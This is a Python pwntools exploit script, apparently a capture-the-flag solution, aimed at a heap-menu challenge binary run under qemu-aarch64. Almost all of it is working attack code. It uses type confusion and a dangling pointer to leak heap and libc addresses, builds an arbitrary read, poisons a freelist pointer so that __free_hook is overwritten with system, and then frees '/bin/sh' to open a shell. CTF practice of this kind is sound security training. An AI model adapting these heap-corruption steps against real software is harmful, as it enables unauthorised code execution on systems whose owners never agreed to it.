from pwn import *
from sys import argv

TYPE_LONG   = 1
TYPE_DOUBLE = 2
TYPE_STRING = 3

CMD_ADD     = b"1"
CMD_GET     = b"2"
CMD_EDIT    = b"3"
CMD_DEL     = b"4"

CURRENT_IDX     = 0
ARCH            = platform.machine()
if ARCH == "x86_64":
    MAIN_ARENA_OFF  = 0x1ebbe0
    LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
elif ARCH == "aarch64":
    MAIN_ARENA_OFF  = 0x16dac0
    LIBC_PATH = "/lib/aarch64-linux-gnu/libc.so.6"
else:
    raise Exception("Platform not supported")

def add(s, typ, data):
    global CURRENT_IDX

    CURRENT_IDX += 1
    s.sendlineafter(b"> ", CMD_ADD)
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.sendafter(b"Data: ", data + b"\n")
    return CURRENT_IDX - 1

def get(s, idx, typ):
    s.sendlineafter(b"> ", CMD_GET)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.recvuntil(b"Data: ")
    return s.recvline()[:-1]

def edit(s, idx, typ, data):
    s.sendlineafter(b"> ", CMD_EDIT)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.sendafter(": ", bytes(str(data), "utf-8") + b"\n")

def delete(s, idx):
    global CURRENT_IDX

    CURRENT_IDX -= 1
    s.sendlineafter(b"> ", CMD_DEL)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    return

def create_dangling_ptr_in_fpool(p):
    for i in range(40):
        add(p, TYPE_STRING, b"R"*0x60)
        list_data_ptr = int(get(p, 0, TYPE_LONG))
        delete(p, 0)

    for i in range(8):
        add(p, TYPE_LONG, bytes(str(0), "utf-8"))
    for i in range(8):
        delete(p, 0)

    return list_data_ptr

def leak_ptrs(p):
    add(p, TYPE_STRING, b"A"*0x10)
    for i in range(9):
        add(p, TYPE_STRING, b"C"*0x7f)
    for i in range(8):
        delete(p, 0)

    # leak heap (type confusion)
    heap_addr = int(get(p, 0, TYPE_LONG))

    print("[*] edit list[1] to point to list[0], which has main_arena symbol in its content")
    edit(p, 1, TYPE_LONG, heap_addr)

    print("[*] delete list[0], move list[1] one position backward")
    delete(p, 0)

    print("[*] read the dangling pointer in list[0] with TYPE_STRING, leak libc")

    main_arena = u64(get(p, 0, TYPE_STRING).ljust(8, b"\x00"))
    return (heap_addr, main_arena)

def arbitrary_read(p, addr):
    idx = add(p, TYPE_LONG, bytes(str(addr), "utf-8"))
    val = u64(get(p, idx, TYPE_STRING)[:8].ljust(8, b"\x00"))
    delete(p, idx)
    return val

def scan_stack(p, start, target):
    addr = start & 0xfffffffffffffff0
    while addr > start - 0x2000:
        val = arbitrary_read(p, addr)
        if (val & 0xffffffff) == (target & 0xffffffff):
            print("[*] found list ptr on the stack! 0x%x" % addr)
            return addr
        addr -= 8

    raise Exception("failed to find list")

def exploit(p, libc):
    global CURRENT_IDX
    CURRENT_IDX = 0

    # start by leaking heap && libc addresses
    list_data_ptr = create_dangling_ptr_in_fpool(p)
    print("[*] good, now fpool[0] points to list. list_data_ptr == 0x%x" % list_data_ptr)

    heap_addr, main_arena = leak_ptrs(p)
    print("[*] heap_addr @ 0x%x" % heap_addr)
    print("[*] main_arena @ 0x%x" % main_arena)

    libc_base = main_arena - MAIN_ARENA_OFF
    free_hook = libc_base + libc.symbols["__free_hook"]
    system_addr = libc_base + libc.symbols["system"]
    print("[*] resolved addresses:")
    print("\tlibc @ 0x%x" % libc_base)
    print("\t__free_hook @ 0x%x" % free_hook)
    print("\tsystem @ 0x%x" % system_addr)

    print("[*] I want to arbitrary free list->data. But we need its tag!")
    print("[*] lets leak it from main's stack")

    # leak an address on the stack
    env_ptr = arbitrary_read(p, libc_base + libc.symbols["_environ"])
    print("[*] env_ptr == 0x%x" % env_ptr)

    stack_addr = arbitrary_read(p, env_ptr)
    print("[*] stack_addr == 0x%x" % stack_addr)

    # start corruption phase!
    strings_idx = []
    strings_idx.append(add(p, TYPE_STRING, b"P"*0x60))
    strings_idx.append(add(p, TYPE_STRING, b"P"*0x60))
    strings_idx.append(add(p, TYPE_STRING, b"P"*0x60))
    delete(p, strings_idx[1])

    print("[*] trigger a free of the list pointer, and call edit to corrupt FD and gain arbitrary write")
    edit(p, 1, TYPE_LONG, list_data_ptr)
    delete(p, 1)
    
    print("[*] corrupt list_data_ptr->FD, make it point to __free_hook")
    edit(p, 0, TYPE_LONG, free_hook-0x60)
    edit(p, 1, TYPE_LONG, 0)

    # Because our arbitrary write is by controlling malloc's return value, and
    # our controlled VA is in the freelist of larger chunks, we need to actually
    # allocate a long string. So pad with random data (just not NULL bytes), and
    # add the address of system at the end
    for i in range(2):
        fake = b"A"*0x60
        fake += p64(system_addr)
        add(p, TYPE_STRING, fake)

    print("[*] free('/bin/sh') --> system('/bin/sh'), call interactive")
    bin_sh_idx = add(p, TYPE_STRING, b"/bin/sh")

    delete(p, bin_sh_idx)

if __name__ == "__main__":
    args = ["qemu-aarch64"]
    if len(argv) > 1 and argv[1] == "debug":
        args += ["-g", "1337"]
    args += ["./challenge/chg"]

    libc = ELF(LIBC_PATH)
    cnt = 1
    while True:
        try:
            print("-" * 0x10 + ("Try number %d" % cnt) + "-" * 0x10)
            p = process(args)
            exploit(p, libc)
            print("[*] Done! Exploit works! cnt == %d" % cnt)
            print("[*] exploit done, system('/bin/sh') achieved, call interactive()")
            p.interactive()
            input("Done")
        except Exception as exp:
            print(exp)
            p.close()
            os.system("rm -f qemu_chg* core")
            cnt += 1
            continue
